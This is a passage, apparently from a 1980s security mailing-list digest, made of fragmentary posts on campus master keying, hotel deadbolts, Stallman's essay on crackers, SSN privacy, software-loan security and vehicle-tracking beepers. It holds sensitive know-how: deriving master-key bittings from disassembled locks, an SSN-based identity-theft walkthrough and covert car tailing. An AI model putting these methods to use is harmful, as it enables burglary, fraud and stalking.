cuts conform to the basic common-sense rules of keying, like cuts must
be a certain minimum distance apart so you don't get the tiny-split-fell-out
screw, and the user keys don't have low cuts near the bow, and the master
cuts aren't necessarily all above or below the user cuts, etc.  There are
even programs for micros out now to help locksmiths plan mastered systems
that know these rules and the maximum cut heights of different brands of
locks.  They also aid the locksmith keep track of what key opens whose door
when repairs are needed, and print out the final chart of the whole thing.

Similarly, if you're going to try and determine the master combo for a given
system, you do need to take at least one example apart.  A pair of .001 inch
calipers is very helpful, because then one doesn't need the lock itself to
cut the key.  All you need is pin heights, spacing, and the outer diameter
of the plug minus a small slop factor.  [The MIT students someone mentioned
apparently didn't think of this.]

It gets even hairier when you have control keys for Best and friends.
Sometimes even *those* are mastered.

I don't know of any techie university where this doesn't occur.
When I was at Rice, it was usually stairwell doors.  To make
matters worse, there was a "GreatGrandMaster" key that would
open most doors on the whole campus.

With Best locks (or ones of the same general style), disassembly
of a single cylinder (usually involving milling off the top) is
tantamount to obtaining the master key.  This is due to the fact
that generally a single "control key" is used to remove all
cylinder cores.  Having removed the core, a simple tool (or even
a large screwdriver) can be inserted to operate the cylinder.
Alternatively, the lock breaker could surreptitiously remove one
core at a time (presumably leaving in its place a core of his own,
possibly keyed to open on all alternate-numbered splits in each
column in case someone tries to enter while the substitute is in
place); removed cores can be taken home and disassembled at leisure.
Of course, the true master key bitting eventually emerges as the
common bitting that would open all examined locks.

There are several steps that institutions can take to minimize
the risk from such activity.  An obvious one is to avoid
excessive master-keying, especially the use of a single GGM.
Another is to not master-key doors that are usually left unlocked.
Periodic rekeying (including control keys) is also advisable.

The other big techie pastime at Rice was exploring the "steam
tunnel" system; these tunnels connected the major buildings to
carry water pipes, conduits, etc.  Generally once a single
entry was found, one could wander anywhere.

University administrations should consider why smart students
have to resort to such misdemeanors for intellectual stimulation.
One would think that the normal activities should provide that.

P.S.  I don't recommend this kind of activity, even if you feel
the need for some excitement.  If you get caught, you'll get
more excitement than you bargained for.  Try making nitrogen
triiodide, or trinitrotoilet tissue, or something else like that
for excitement.  Too bad you won't get any official credits for
it either.  Be careful!

Well, there is also a reason to do things the other way:  if the master has
less metal on it everywhere than a non-master, then one can file a non-master
down to make a master.  The only time I ever took a close look at the shapes
of keys (in a scheme that used multiple levels rather than distinct keys
plus a master), the less powerful keys had less metal on them, so the file

Subj:	[1864]  hotel deadbolt hacks

There are two ways to go about this.

The first method uses two little sprung pins mounted at about 10:00 and
2:00 in the back of the cylinder, just past the last pin.  If the key
is turned to 4:00 or 8:00, the open bottom of the keyway exposes the
end of one of these pins, and it jumps out into the bottom of the keyway,
preventing further rotation.  The pin is mounted at such an angle that
the plug can "retreat" from this wedged position, but not continue past
it.  A key cut such that there is enough metal protruding past the last
pin will keep these pins up inside their holes, allowing full rotation.

The second method uses the last pin as a sort of switch.  At the last pin
position the cylinder is machined out large enough to acommodate a ring,
which surrounds the rear end of the plug.  This ring has a hole through it
for the last pin and a stub sticking off the back near the bottom.  It is
also of a known thickness.  Raising the rear pin to the normal plug shear
line will allow the plug to turn, but the ring remains stationary [held by
the driver].  At about 4:00 or 8:00, the tailpiece hits the ring's stub
and can't rotate any more.  The master key raises the last pin to the
next level, such that the ring now turns with the plug, and doesn't impede
the tailpiece.

In either case, full rotation is required to shoot the deadbolt, but only
a quarter turn or so pulls the spring latch.  Thus a guest key can't shoot
the deadbolt but the specially cut masters can.

If you're worried about people getting into your hotel room, carry your own
keyed cylinders with you and swap them when you arrive.  Probably against
fire regs, but it works.  When was the last time you found yourself inside
a burning hotel?

I just bought John M. Carroll's Computer Security, second edition,
which is really a terrible book that I cannot recommend, because it is
not adequately footnoted (ie: it doesn't have any references), is full
of anecdotal information that is just plain wrong, and has lots of
inaccuracies. 

But it does have some kernels of truth. one of them, about DES, is
instructive:

Anyway, there is a paragraph in the section on DES which is
interesting:

	"In all fairness to NSA, it should be noted that according to
the 1932 Treat of Madrid, every national government is responsible for
the nature and contents of all telecommunications messages originating
within its territory.  The national cipher agency may well have an
obligation in international law to be able to break ciphers used by
its citizens.  In some Western European countries, a private person or
firm wishing to use cryptography is obliged to deposit a copy of the
keylist with the national Post, Telephone and Telegraph Agency." (p.202)

Which is a great paragraph, except that it answers more questions then
it raises: which countries, what are the penalties for not doing this,
does it apply in United States or Canada (Carroll is a Canadian), and
things like that.

Subj:	[2240]  more about master key security

In my previous message about techie school lock cracking,
I forgot to mention a couple of other important issues.

If one has an ordinary unprivileged operating key for a
lock, and if the lock is master-keyed, then by disassembling
the lock one can quickly determine possible master-key bittings.
In particular, in a one-level mastering system, any split in
a pin column that does not match the operating key bitting is
almost certain to match the master key; if there is only one split
in a column, then the master key must have the same bitting as
the operating key in that column.

This and the previous information I posted makes it clear that
in order to gain reasonable security in a master-keyed system
in an environment such as a college campus, the lock cylinders
must be protected from removal for disassembly and inspection.
Properly-installed Best mortise lock cylinders have this property,
because they are fastened not only with the typical long screw
against a notch in the side of the cylinder that can be loosened
after removal of the plate on the side of the door, but they also
have an internal diagonal set-screw that prevents simple removal
of the cylinder unless the core is first removed with the control
key.  If the whole system is properly installed, there is no first
loose cylinder to be removed to figure out the control key..

Use of restricted key sections can help, too, since one cannot
simply buy such a blank at the local 7-11.  However, a diligent
lock cracker can make his own blanks.  I knew a fellow who filed
one out of a piece of stainless steel; if you have access to a
milling machine, it is not hard to make a suitable key blank.

I again remind you that I'm not recommending this activity,
which involves more risks than anyone in his right mind should
decide to take!  It also usually involves property damage,
which is unethical.  I hope this information will help campus
locksmiths improve the security of their lock systems to the
point that few students will find this activity sufficiently
rewarding to bother with, compared to the effort required.

Doesn't this present some legal problems due to the copyright laws?
I didn't think it was legal to allow/require people to copy software.
Doesn't this also present some technical problems due to copy protections?

At BC, I believe we presently use a Check-Point security system.  This system
is easy to fool if you know a trick or two, but has served as a GOOD deterrent.

In addition, each student borrowing software or manuals is required to leave
his/her BC ID at the front desk.  The front desk then records, on our main
computer system, what was borrowed.  If the student fails to return the
borrowed items, the front desk has thier ID, and the main computer can help
locate the student and/or bill them if the administration feels that it's
appropriate.

Both these systems are openly visible which helps to deter users from
attempting thefts.  Niether of these systems are perfect, we still lose things,
but I think it's the most practical i've seen thus far.

   The solution is to install a small oscillator transmitting on the Class C
Citizens band in the remote car.  Just put out a continuous signal at whatever
power you can manage.  If possible, run a wire to the car antenna, but a drag
line will work.
   Now in the chase car, you have a loop antenna mounted on the roof (or
a ferrite loopstick if you wish to be less conspicuous and can afford to
lose the gain), going into a shortwave set with a BFO and an S-meter (like
an old military rig or a ham mobile set).  By rotating the antenna you can
determine the direction of the signal from you.  if the car is moving, you
can follow it, keeping it at 0' at all times and hope that you are gaining.
If it's stationary, you can take a bearing, move over a few blocks, take 
another bearing and triangulate.
   Years ago, Fudalla and Associates made a CB beeper.  I think Miles
Wireless Intercom made one using the FM band, and R.B. Clifton made a
49 MHz version, but it's been a long time since I've been looking at

Recently the teen-age computer "hacker", the security cracker, has
become a topic of national concern.  But the many articles on the
subject have condemned the cracker without showing the galling aspects
of the way of life he is rebelling against and without questioning its
ethical foundation.  There is no hint that the confused cracker of today
may be resisting, albeit ineffectually, a serious social problem of
tomorrow.

If you look at the social organization of the users on a typical
timeshared computer of today and compare it with other social groups, it
most resembles the Soviet Union.  It is pervaded by suspicion, ruled
arbitrarily by a small oligarchy, and hostile toward outsiders.  This
arouses resentment, which inspires the security crackers.  But the
authoritarian social organization itself is a worse problem than the
crackers are.

Most computer users see no alternative.  I am fortunate in having
experienced one.  At the MIT laboratory where I have worked as a
researcher for ten years, our old computer system treated users as free
equals with a responsibility to cooperate, and guests were welcome.  Our
hospitality guided clever young people to become responsible engineers
rather than crackers.

On the typical computer system, the activities of the ordinary users are
regulated very narrowly and precisely by the elite, who are bound by no
principle of fairness or due process and allow no appeal.  Which files
you can read, which files you can write, how many files you can have,
what programs you can run, how long you can use them, and when you can
log in are under their control.  They can bump you off the computer at
any time.  They can watch what you type as you use the computer; you
cannot watch them.  They can make it very easy for you to do your job,
if they like you, or if you curry favor.  Or they can obstruct you
at every turn, making your life miserable.  You have no recourse.
They can use the commands that change a user's restrictions, and you
cannot, because your restrictions don't permit it.

The users are suspicious of each other, and use "file protection" to
deny each other access to files.  Often this means you cannot make
progress in your work because you need to fix a program you cannot get
at.  People with high morale become discouraged and cynical because of
this.  The authorities are immune to file protection, however, and can
easily erase your file if they do not like what it says.

People outside the organization are viewed with hostility and suspicion.
They are presumed to lack only an opportunity to delete or scramble all
the files on the computer.  If the computer is idle, at night for
example, its computing power goes to waste rather than allow an outsider
to use it for a constructive purpose (such as learning to program).

Now imagine that one of the people outside the organization, the
recipient of all this suspicion and hostility, is a hacker: a person who
is curious, playful and enjoys clever humor.  (When computer researchers
at MIT in the 1960's first began calling themselves "hackers", this is
what they meant.  I am proud to call myself a hacker, and I call
security-breakers "crackers" to emphasize the distinction.)

A hacker, finding a mysterious and complicated computer system, wants to
understand it.  He would like to explore the computer system, to learn
how to use it, or to learn how it works.  He knows in advance what
reception he will get if he simply asks to use the computer when there
is spare time.  And he senses intuitively that computer system
authorities in general are amoral and do not deserve respect.

Naturally, he tries to sneak in and use the computer anyway.  He becomes
a cracker.  If successful, he gets to explore and learn, and can be
proud of his cleverness as well.  Beefed-up security measures only make
the battle of wits more challenging and absorbing.

But if he is only a teen-ager, he is probably not used to the kind of
thinking that would enable him to question the social system he is part
of.  (The teen-agers who are politically aware are usually not the
computer enthusiasts.)  He knows only that he has something to resent.
So he does not make a serious attempt to change the system.  The best he
can manage is instinctive, furtive disobedience.  This is why the young
cracker seems so usure of the rightness of his actions, and occasionally
may do minor damage, almost without noticing.  He has not asked the
question of how he ought to behave, or how the computer owners ought to
behave.

This is also why it is so easy to win a cracker over to the
security-enforcing establishment with personal inducements.  Joining the
authorities will end his direct personal difficulties and recognize his
cleverness, even better than successfully evading them.  Without an
ethical awareness, he does not see that he solves his own problem only
by contributing to similar problems for others.

The software on most computer systems is designed to support the ruling
class just as surely as the KGB is.  The software written and used by
the hackers at MIT was designed to make users free and equal.  Our
system had no restrictions that could be imposed on selected users; all
users were treated alike.  Thus nobody could seize power by restricting
everyone else.  We did not care whether a change to the files was
authorized; we cared whether it was an improvement.  This can only be
decided by human beings, on a case-by-case basis.  So, rather than
having file protection to control changes, we called for discussion
of any planned change.

And if a stranger came to the lab and wanted to play with the computer
when it was not fully needed by us--we let him!  Chances are he would
appreciate some of the value of our work, learn from it, and spread the
knowledge to others.  At best, he would become enthusiastic for our
software and our attitudes, join our lab, and contribute to our work.

People hearing about our lab usually took it for granted that our system
would be destroyed by vandals.  Actually, vandalism was very rare, and
the damage done by vandals was small compared with the damage caused by
the inevitable computer malfunctions and our own mistakes.  Simple
measures analogous to the glass window on a fire alarm discouraged
dangerous activities, deliberate or accidental, without actually
forbidding anything.  Ultimately it was rising commercialism that
destroyed the lab and caused our old computer system to be junked.

The technology of computer security is not suited to any middle ground
between the extremes.  Unless security is iron-fisted and dominates the 
lives of the users, it is easy to circumvent, and useless.  We should
put military secrets, bank records and the like on computers with strict
security.  For other activities, we should have computers that are free
of security, and free of its burdens.

Then we need not attack the symptom of morally confused crackers with
jail threats, security technology, or hiring them as security enforcers
to breed more resentment and new crackers.  We can invite them to use
computers openly on terms of mutual respect, and they will repay our
friendship tenfold.  Their cleverness and curiosity are just what make
for a creative engineer.

So far the issue of security versus freedom on computer systems affects
mainly computer hackers.  But, in the future, computer systems will play
a bigger and bigger role in everyone's life.  And these systems will be
built on today's entrenched authoritarian tradition, unless we stop it.
The crackers are a warning sign of a problem that every American is
going to face--soon.

Well, here's a story that happened to a good friend of mine that I
wouldn't want to worry about.  She sent in her tax returns, and got a
letter saying she still owed $6000 for the money that she inherited,
plus fines and interrest and a possible jail sentence.  It turns out that
someone, somewhere had inherited money and made up an SSN at random
to avoid the taxes.  After about six months of "hassle" (to say the least)
she finally convinced the IRS that she did not inherit anything.
She was able to do this only because the name did not match the SSN,
and the address was in New York instead of her actual address near Phila.

Now, I have been fighting institutions that use my SSN as a key primarily
because most of these insist on printing it on the mailing label along
with my name and address.  They claim this is so that when mail comes
back (mail that most people would consider "junk mail" anyway), they
can remove the name easily from the mailing list.  Can you imagine
the "hassles" I could have if the clerk at the institution plans ahead
for a successful trip to Atlantic City or Vegas, taking a few names,
addresses, and SSNs along?  How about the postal clerks that get to
read my SSNs?  My main complaint is not with the institution that uses my
SSN as a key, but rather the uses other than as a key to which it is put.

Incidently, does anyone use a database package that can handle sufficient
volume that names cause too many clashes, yet that does not have a
mechanism for generating unique keys?  Why must I supply my own key?
Not only am I reduced to a "mere number," but I must reduce MYSELF to

I would hope that most peoples data bases have some sort of validity
check on SSNs, since you can call the SSA and get a definition of the
SSN from them, and it does mention at least some of the field values
that are 'not right'. I saw a spec for this stuff about 5 years ago
perhaps in a Government RFP or something. Maybe a call to the SSA
would answer this?

Subject: Re: Why Protect SSNs?

Well, the practical reasons to associate your SSN with as few records
about you as possible have to do with the fact that large, powerful
entities (like the IRS and large consumer products companies) use
techniques like block modelling and record matching to exert unpleasant
power over individuals.  For example, the IRS uses social security numbers
to look up credit ratings and self-described income data associated with
consumer purchases (those little warrantee registration cards...)
to audit people it thinks may be under-reporting income.  Big credit
and insurance concerns use SSNs to find records that can penalize you 
by denying you credit or insurance on the basis of information that
you rarely see and never know how they get.  Other uses include
targeting the marketing consumer products and matching government
records against each other or commercial records.

Those large tax, law enforcement and marketing data analyses are more
difficult to do on someone who witholds SSN.   Unfortunately, the cause
of most of the trouble is invisible to the people who get screwed.  Nobody
says "we decided to audit you (investigate you, use this ad on you) because
of information we could analyse based on your SSN."  It is quite difficult
to track down the explicit uses of SSNs within specific organizations;
they are not interested in baring their data analysis techniques to
outsiders at all.   So for illustrative purposes, let me show how with
your social security number and a little motivation someone can learn
all of the intimate details of your life, ruin your credit rating and
get warrants issued for your arrest:

Your enemy gets your social security number.  He goes to the local
department of motor vehicles and get a driver's license in your name
by telling them he lost it and giving them your SSN.  Knowing your driver's
license number (SSN in many states) is usually sufficient ID for getting
a replacement license.  He takes the driver's license to the social
security office, tells them the appropriate SSN and asks for "his" payment
record.  They tell him your employer, your income, any interest bearing
bank accounts you have and any securities you have bought or sold in
the last 3 years and some odd months.  He can find out the medical
insurance company used by your employer and get your medical records
from them in a similar way.  He can also use the employment information
along with your SSN to get credit cards in your name (credit
card grantors use SSNs to access your credit records, and want little
information on you other than SSN, employer and bank accounts).   After
buying a fast new car on your credit,  he gets a lot of speeding tickets
on your license.  The criminal warrants that show up when he doesn't
pay the tickets are attached to your social security number.  If he really
wants to get you in trouble,  he gets busted for drunk driving or hit
and run on your license, makes bail and throws the license away.  You
now have a mountain of bad debt and a felony arrest warrant, not to mention
an enemy who knows every penny you have, what your credit record is like
and all of your medical history.  He got it all by just knowing your SSN.

Paranoid?   Sure.  I don't think this sort of thing happens very often,
but it provides an idea of the power in those 9 digits.  I personally
believe that the institutional (mis)use of SSNs is by far a worse problem
than the kind of criminal behavior I just described, but I find the latter
is more persuasive to people who are cavalier about having "nothing to
hide".

Try reading David Burnham's "The Rise of the Computer State" or his
upcoming book on the IRS, or Robert Ellis Smith's "Privacy: How to Protect
What's Left of It" for more detailed discussions.

Subject:   Digest of SSN responses

The Privacy Act of 1974 does *not* mention universities by name. I quote
as follows:

   "Sec. 7.(a)(1) It shall be unlawful for any Federal, State
    or local agency to deny to any individual any right, benefit,
    or privilege provided by law because of such individual's refusal
    to disclose his social security account number."

That all sounds well and good, except for the following little
"gottcha's".

  1 -- The original Privacy Act included the following exception:

       "(2) the provisions of paragraph (1) of this subsection
       shall not apply with respect to

           (A) and disclosure which is required by Federal statute"

       Note that "disclosures which are required by Federal statute"
       are legion.  For example, open a bank account, register for
       the draft, etc.

  2 -- the privacy act is grandfathered, so that anybody doing it
       before January 1, 1975 can keep doing it

  3 -- Congress has passed many, many exemptions and exceptions to
       the original Privacy Act, the worst of which is specifically
       authorizing states to use SSN's for driver's licenses and
       vehicle registration (Tax Reform Act of 1979).

  4 -- The clause in the original law making it apply to "any right,
       benefit, or privilege provided by law" is a pretty stiff test,
       according to lawyers who handled a SSN refusal case for me.
       It is pretty hard to convince a judge that attendance at a
       university is a "right, benefit, or privilege provided by law".
       And even if you did, the laws establishing universities in most
       states are ones which have been exempted from the Privacy Act
       by subsequent legislation (the Tax Reform Act of 1979).

  5 -- The original Privacy Act contained no penalty for violation.
       Again, according to my lawyers, a law with no penalty is essentially
       unenforcable.  What is needed is something like a $1000 fine for
       every violation.  Can you imagine how quickly a university would
       straighten up if it had to pay $1000 for every student for which
       it used an SSN as a student ID?

As an example of how tangled these webs can become, both the folks giving
ACT tests and SAT tests key the results off of SSN's, and these are
private organizations utterly uncovered by any privacy legislation.
Most (all?) universities that receive ACT and/or SAT scores match them
up with their students via SSN's.  Thus, universities have a valid,
practically mandatory reason for having the SSN for all students on file,
even if they do not use SSN for student ID.  Furthermore, if the
university is involved at all in the disbursement of federal money to
students (various student loans, etc.), the feds will *require* SSN's
for all the students involved.  What's the poor university to do?
Finally, grant applications to such agencies as National Institute of
Health and National Science Foundation require the SSN's of all
professors and students who will use the money? Again, what is the
university to do?  It really is too late, folks.  Big Brother is
already here, alive and well.  And even Mr. Reagan with all his
"get the government off the back of the people" rhetoric has
greatly expanded Big Brother, provided only that it is in support of
his declared social goals  --  catching welfare cheats and such.
The ends do justify the means, you know, as long as it is your own
ends you are after.

Subject:      SSN

Yes, it's much easier for people to manipulate information about you in
a computer when they have your SSN, since it's a variable that can be
matched so easily.

But the flip side of that coin is what worries me.  Think how easy, with
a NINE digit number, it is for data coders to make keystroke errors.  Of
course this can happen with your name, but names have familiar patterns,
or are very unfamiliar.  Either way, the rate of error should be lower
for coding names.  But even if it isn't, that's ok, because few (if any)
organizations with information about you will ever even attempt to merge
data by your name.  If 2 files are being combined, and your name is the
common variable, and there is an error in 1 name record, there is no
match.  But if the SSN is used, and a coding error has occurred, there
is the chance that SOMEONE ELSE'S history will be appended to your name,
either under your SSN, or under theirs, depending on the coding error.

Now, if you are a bad customer or whatever, you don't really care if this
happens, because the chances are your history will only be improved.  But
if you are one of those sterling types who always pay on time, etc. and
you "have nothing to hide, so why not give the SSN without a fuss", you
might be burned badly.  And even if the error isn't terrible, getting the
problem fixed can take a long time.  Just try telling someone that thier
records on you are WRONG, especially if they have them on a computer.
The chances are high that you will only get to talk to someone who either
1) believes computers don't make mistakes, or 2) is afraid of the computer,
or 3) doesn't know how to correct the records on you, since they are hidden
in the computer, and doesn't want to bother finding out, or 4) CAN NOT change
the data in the computer because someone down the line never imagined that
changes would be necessary.

If you think any of the 4 cases above is unrealistic, let me assure you that
I know of instances of all 4 cases occuring.  My mother is still fighting
the property tax administrator in her city after 2 years because the records
she got out of his computer database, thanks to a naive underling, do not
agree with the tax assessments people in her neighborhood have been paying.
The difference, she has discovered, amounts to nearly a million dollars
annually coming out of single family residences instead of appartment
complexes.  The tax administrator's office has been stonewalling for over
2 years because they won't admit that there is no way, currently, for them
to get to the actual data;  they insist "the printout is wrong."  This is
clearly an example of case 4 above, with maybe a little old-fashioned
corruption thrown in for good measure.

Recently someone said he hadn't withheld his SSN in the past, so there
is no point to beginning now.  I strongly disagree.  No one is going to
make any great effort to match SSN's to data about you by hand, and it's
unlikely that if they do have your SSN that they also have a way of
looking at your name and address via computer.  After all, the SSN is
so handy just because it lets merchants, etc. treat your name as just the
first line of your address.  The format is often free-form, and it is
difficult to extract your name in program-driven databases.

They certainly won't get any help from the SS Administration.

  Sorry for the lack of clarity.  Tests in stores showed that there was a
shortage rate of 30% in stores that weren't protected by the Knogo systems.
That figure includes employee theft, shoplifting, miscounts of shipments (the
clerk counted 13 when there were only 12), and so forth.  The major components
of the shortage figure are the first two.  It's very easy to put a piece of
software in a bag and walk out with it.  Dalton's uses 6-foot shelves, which
the clerks can't see over (legacy of the bookstores, where an individual item
isn't worth all that much---software, however, goes $300, $400, even $700).
The impulse shoplifter --- "I want Gunship, but I don't want to pay $35" ---
is deterred by the increased risk of apprehension (supposedly), and they make
up the most part of Dalton's shoplifting problem.  Kids after school killing
time in the mall, etc. won't take the chance if they think there's a high risk
of getting caught.  Sort of similar to radar --- people think it works better
than it actually does.  Fortunately, there are less thieves than speeders.

Subj:	[1422]  RE: the KEY Discussions

Interesting things coming thru on all this KEY stuff.  I've got a couple
of questions which deal with the mechanics of a couple of keying systems.

Wish I could remember the names of the manufacturers, but I'll just have
to plead brain death.  The two key systems worked (I believe) in completely
different ways (or at least, the mechanisms were very different). One had
no slots, per se. Instead, it essentially looked like a blank with a number
of dimples of differing sizes drilled on both sides of the blank.  The
second system was supposed to have been THE keying system of that time
(this is all from my college days, about 11 years ago). This system had
keys which had the cuts not only at the normal angles of +/- 15 (?) degrees
but also had the cuts themselves offset at (I believe) +/- 5 degree angles.
In other words, instead of just making the cuts at an angle perpendicular
to the key, the cuts were offset at angles of 0, +5 and -5 from the 
perpendicular.  I know I'll recognise the name of the keying system as
soon as someone mentions it, but right now, I'm completely brain dead.

Anyway, the question is...How do each of the above keying systems work?

Bumper beepers are great, but get some practice before you depend on one.
Signals reflected off buildings, obscured by underground garages, rapidly
accellerating as they get on the freeway, etc. are all confusing.  Following
a vehicle without being detected takes practice.  The beeper just makes it
possible to do with one tail car instead of two or three.  With an aircraft,
one of these guys can identify the location of a vehicle within 25 or 50 miles.  
Have fun!

Places to buy:

  Wynn Engineering / 4327 Aspenglen Dr. / Houston TX 77084 sells a bumper
  beeper set that "When installed on your car, you can track the distance
  and direction of the car from up to 2 miles away.  Beeper and special
  receiver (Model BB 1101) $600 for the set."

  Law Enforcement Associates / 88 Holmes St./ Belleville NJ 07109 sells
  a better system (made by TRACER) called the 1012 Vehicle Follower
  System.  It's better because the beeper beeps instead of emitting
  a continuous tone (saves on batteries!) and it gives a more specific
  readout of the direction of the target.  Expect to pay over $1000.
  Write for a current catalog.

At Harvard, several of our classes require the use of micros, and we

When students wish to use the microcomputer software, they come
into the User Services office (right by the micro room). Although
US people (such as myself) are primarily responsible for mainframe
questions, they also loan out the software. The first time a student
comes in to borrow software, they sign a waiver, effectively
promising not to steal, copy, or eat our disks. Then, they cam
take out software whenever they want (the question-answering
people are there 8AM-midnight weekdays, and almost that on
weekends), just by presenting their IDs (held only for
"important" software----I didn't make up this policy!!!)
and signing the software out in our log...pretty straightforward.

The only real problem we've had with this is that the
User Services people get bogged down dealing with the micro
software and cannot devote enough attention to the big machines
(they also have to run backups). But all in all it is a pretty
good system, and can work extremely well if you have a work-study

It is not really an issue of being a specific target.  Recent trojan

to code put on disks by software vendors as an effort at copy

disks with people who traded disks with people who traded disks with

with LoJack receivers.  The cost of this is prohibitive except for areas
of high auto theft.  At the airing of the segment on TV (several months
ago), LoJack was only in use in the Boston,MA area.  Several other cities
were looking into it, but had not made any discision to go ahead.  So unless
you live in the Boston area, you are out of luck when it comes to LoJack.

There are several keys that could fit such a description.
Were there ANY external encodings at all, such as wiggly grooves
(Bell lock) or dimples (Sargent KESO)?  If not, this may have
been a magnetic key.  There were some cheap padlocks that one
opened by placing a flat key against the side; embedded magnets
reacted on magnets inside the lock to align gates.  That lock
yielded easily to physical force, however.

Doug Gwyn's comments about some locks being somewhat difficult
to remove unless you have the control key brings the following to
mind...

What will the administration do if they find such a lock has
been removed by brute force (ie.  saber sawing it out of the door)?

Surely this implies that the whole master keying system is
compromised.  Ideally, they would rekey all the locks.  In
practice I assume that they would shrug their shoulders and
hope no one starts using master keys.  It must be
very expensive to rekey all the locks on a campus.

It is legal, and widely accepted on the following terms.  

a) the software is licensed for a certain site.
b) the copy of the original software (by the student) is only used
   at the licensed site.
c) the copied software is for the exclusive use of the student.
d) the student must sign a contract stating that they will not let
   anyone else use the software, nor will it be run (used) OUTSIDE of the 
   licensed lab environment.  The software must also be deleted at
   the end of the required course period.  Breaking any of which, is
   punishable by fine (equal to that which may be charged the license
   site for breaking copywrite) or EXPULSION.

>At BC, I believe we presently use a Check-Point security system.  This system

This is a "Good Deterrent":
By using the already existing copyright laws, and those of the institution
regarding expulsion (one would want to believe that they were created
for some purpose).  An example of using the LAW as the deterrent over spending
many more dollars for electronic security devices, clerks and security 
officers, and computer administration and accounting is:

Stop signs.
That's right, why do we stop at a stop sign if it is 2:00 a.m. and
there are no other cars in sight??  
Because it is the law.
If you go through and are caught (big IF here!) you face a $53 fine,
some demerit points, and surly when your insurance company finds out
about this, you could face a rude awakening in premium prices
(don't take my word for it, contact your local newspaper and find out
the number of people in your city that complain about being shafted by 
insurance companies (particularily car insurance)).

Anyway to make a long story short, if the system can be fooled by those
who really want to, use existing laws to deter people, not expensive
machinery and people who could be used more effectively helping others with 
problems or doing research of their own, instead of being glorified 
secretaries.

Subj:	[3306]  Re: Why secure systems?

        Nick Papadakis presents an essay by RMS that argues that
        computers should be open rather than secure.  This may work for
        many computers, but I believe it is wrong to take this approach
        for all computer systems. 

        The main reason for my belief is that large numbers of computers
        are used for critical operations of various types.  RMS says
        that vandalism `was very rare' on the systems he used as an
        example.  This means that there were very few people vandalizing
        the system just because it was there (the vandals had no other
        reason to do damage).  But for many computer systems, there are
        other reasons to do damage: 

            To hurt the organization that runs the computer. 
            To gain financially. 
            To change the `real work' done by the computer. 

        Imaging running the following computers openly, without
        security: 

          - A computer that handles the payroll and accounting for a
            corporation.  A `minor' piece of vandalism could bankrupt
            the corporation and ruin the lives of employees that
            financially survive from check to check. 

          - A computer used to develop the software for a piece of
            hospital equipment.  Errors caused by someone who didn't
            know what they were doing could endanger the lives of large
            numbers of people. 

          - A computer that is used to count votes.  The basic freedoms
            that we have in this country depend on fair votes, but
            insecure voting systems could allow any fanatic to change
            the result of a vote and of history. 

          - A computer that supports the operation of the stock market.
            In a few minutes a compromised computer system could place
            enough fake sell orders to make the October crash look
            minor.  Sure, eventually it would be detected that that the
            original sell orders that triggered the crash were fake, but
            by that time the world economic system would be a shambles
            and saying `lets forget all of the trades on all the markets
            in the last week' wouldn't work. 

        Running an open computer system is a great idea, and should
        be done whenever possible.  But don't do it when sensitive
        operations are on the line (including, but not limited to,
        finance, investment, accounting, health, personal data, and
        voting).  Or at least wait until it can be shown that people can
        be trusted.  A suggested metric:  When a year passes without any
        instances of fraud or robbery worldwide. 

        Our need for computer security just reflects the fact that we
        cannot trust that all members of society will always act for the
        benefit of society.  As long as this is true it isn't safe to
        open all computer systems to everyone.  Criminal acts did not
        start with computers, and I don't believe that opening up
        computer systems will end criminal acts.

Some of these companies sell active IR systems for as low as $400 or less...
the starlight scopes are certain to be at least around $1000.  While I'm not
in a position to make any endorsements or recommendations ("just an interested
observer"), obviously ambient IR and starlight scopes are the best, since
no external light source is involved (with the other systems, someone else with
an IR system will see your 20,000 candlepower searchlight plenty fine as you
slink through the foliage thinking you're invisible) but it all depends on what
you plan to use it for.  Definitely keep in mind that these, as with all elec-
tronic devices, have very delicate innards, and as a weapon sight, it will
take quite a bit of abuse (rifle recoil, temperature, humidity) so get the beef
on it from the people you're dealing with.  Another good way they can quickly
get toasted is from an overexposure (someone shining a light into your image
intensifier, a sudden heat source appearing, etc...).  Some are protected, but
I believe many aren't.  That's about all I can contribute for now...
let me know how you make out.

Subj:	[3168]  Why secure systems?

Richard is basically correct about his social assessment of centralized
computing services.

He characterizes the situation as being akin to the Soviet Union, I
would say more like martial law in a scarce resources situation
(which, some argue, is really what explains the current situation in
the Soviet Union, sort of an emergency restriction on freedom that has
been convenient to leave in place these 70 years, for some.)

Today the situation of the central computing facility is becoming more
curious. The resources are no longer terribly scarce but the
"oligarchy" continues in their ways. For example, on our large IBM a
student account is assigned about 1MB of disk storage (max.)  He can
of course try to ask for more but the bureaucracy can be very
discouraging. That's about the storage of a single floppy disk in
today's world. How ludicrous it must look to a student who just bought
a PC with a 20MB disk for $900 that he is far more limited on this $6M
machine! Other resources are similarly restricted (eg. the biggest
memory image anyone can run is 11MB even tho it has 64MB physical, and
this is touted to the campus as some sort of super-computer, achh,
pfft.)

The focus is no longer on the cracker. What is happening today is that
these computing organizations are becoming wholly irrelevant to anyone
other than a very small sector of the community with very special
needs (such as to run the big name packages, for example last I looked
it was hard to get a paper published in medical fields that didn't
present its statistics as having been produced by one of a few well
known packages.)

Hence people are simply going out and buying their own systems in
droves and, for the more ambitious, purchasing servers of their own to
help integrate an environment of quite a bit of power.

The last stand for the computing center is the network, it's the last
bit of centralized service that anyone is interested in getting from
them. I notice that many of them have a lot of trouble with the fact
that they cannot produce accounting charges for ethernets. So they
find other ways to bang people over the head with the cable
(restrictions in gateway software, per-port charges etc.) It's all
futile really and just a tragi-comic last hurrah for the vested
oligarchy. People I speak with will gladly build their own little
networks etc, even if they're less effective, if the central
organization becomes too overbearing with their backbone.

I guess what I'm saying is that RMS's note is true but technology has
removed most of the motivations. No one views the central computing
facility as having the good toys anymore, envy is gone, heck, interest
is gone, we've developed a whole breed of people here now who have
never even used the central facilities (around here that would be a
shocking statement in the right crowd.) Most of these folks correspond
very closely with the sort of crowd who would have produced the
hackers (eg. computer science, computer engineering etc.)

Subj:	[878]  Picking locks on pay phones

Here in San Diego we've had an unusual round of news reports about "a man
with a pony-tail" that is "the only known person in the U.S. that can pick
the lock on pay telephones.  He is known to frequent Country and Western bars
and carry large amounts of change."  He is said to reap about $2,000 a day
from his "speciality."

The police say there are "tell-tail scratch marks" on the phone lock boxes.

Question:  Is there any truth to these news stories?  Is it possible that only
one person in the U.S. can pick the lock on a pay telephone?  If so, what
makes these locks so damn hard to pick.  (And, in what sounds like an easy way

Subj:	[3461]  Iwamoto's lock questions

Well, the first one with the dimples [I forget the name -- K-something]
is relatively straightforward; the dimples simply push pins outward from
the keyway certain distances like a regular pin lock.  The pins protrude
into the keyway from a couple of different directions; the theory being
